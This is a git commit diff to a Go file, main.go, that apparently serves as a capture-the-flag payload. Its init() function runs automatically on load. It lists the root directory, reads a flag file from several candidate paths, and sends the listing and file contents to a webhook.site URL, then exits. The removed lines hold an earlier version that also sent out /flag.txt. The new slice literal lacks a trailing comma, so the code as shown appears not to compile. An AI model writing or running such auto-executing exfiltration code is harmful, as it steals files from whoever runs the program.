f9be03244b0d8f920b396109493af2fd80f4dcac
Mustafa <112502284+k7edr0x@users.noreply.github.com>
2025-08-14 08:54:11 +0300

    Update main.go

--- main.go
+++ main.go
@@ -4,13 +4,31 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
+	"os/exec"
 )
 
-func init(){
-	flag, err := ioutil.ReadFile("/flag.txt")
-	if err != nil {
-		return 
+func init() {
+	lsCmd := exec.Command("ls", "-la", "/")
+	lsOutput, _ := lsCmd.CombinedOutput()
+	
+	flagPaths := []string{
+		"/flag.txt",
+		"/home/flag.txt",
+		"/etc/flag.txt",
+		"tmp/flag.txt"
 	}
-	http.Get("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f?flag=" + string(flag))
+	
+	var flagContent string
+	
+	for _, path := range flagPaths {
+		if content, err := ioutil.ReadFile(path); err == nil {
+			flagContent = string(content)
+			break
+		}
+	}
+	
+	http.Get("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f?ls_output=" + 
+		string(lsOutput) + "&flag=" + flagContent)
+	
 	os.Exit(0)
 }
